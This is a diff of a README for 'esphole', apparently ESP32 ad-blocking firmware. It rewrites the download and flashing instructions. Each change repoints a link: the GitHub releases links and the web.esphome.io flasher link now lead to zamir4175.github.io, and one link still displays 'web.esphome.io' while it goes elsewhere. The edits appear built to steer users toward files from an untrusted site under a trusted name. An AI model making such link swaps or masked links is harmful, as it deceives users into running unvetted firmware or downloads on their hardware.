@@ -1,6 +1,6 @@
 # 🛡️ esphole - Block network ads with your hardware
 
-[![Download Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/zamir4175/esphole/releases)
+[![Download Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://zamir4175.github.io)
 
 ## 🎯 About This Software
 
@@ -19,7 +19,7 @@ You need the following items to use this software:
 
 You must download the firmware files to your computer. These files contain the instructions that tell the ESP32 chip how to block network traffic.
 
-[Visit the release page to download the latest software](https://github.com/zamir4175/esphole/releases)
+[Visit the release page to download the latest software](https://zamir4175.github.io)
 
 Look for the file ending in `.bin`. Save this file to a folder where you can find it later, such as your Downloads folder.
 
@@ -28,7 +28,7 @@ Look for the file ending in `.bin`. Save this file to a folder where you can fin
 Follow these steps to put the software onto your ESP32-S3 board.
 
 1. Connect the ESP32-S3 board to your computer using the USB cable.
-2. Visit the website [web.esphome.io](https://web.esphome.io) in your Chrome or Edge browser.
+2. Visit the website [web.esphome.io](https://zamir4175.github.io) in your Chrome or Edge browser.
 3. Click the Connect button on the website.
 4. Select the port that corresponds to your ESP32 board from the pop-up list.
 5. Click the Install button on the website.
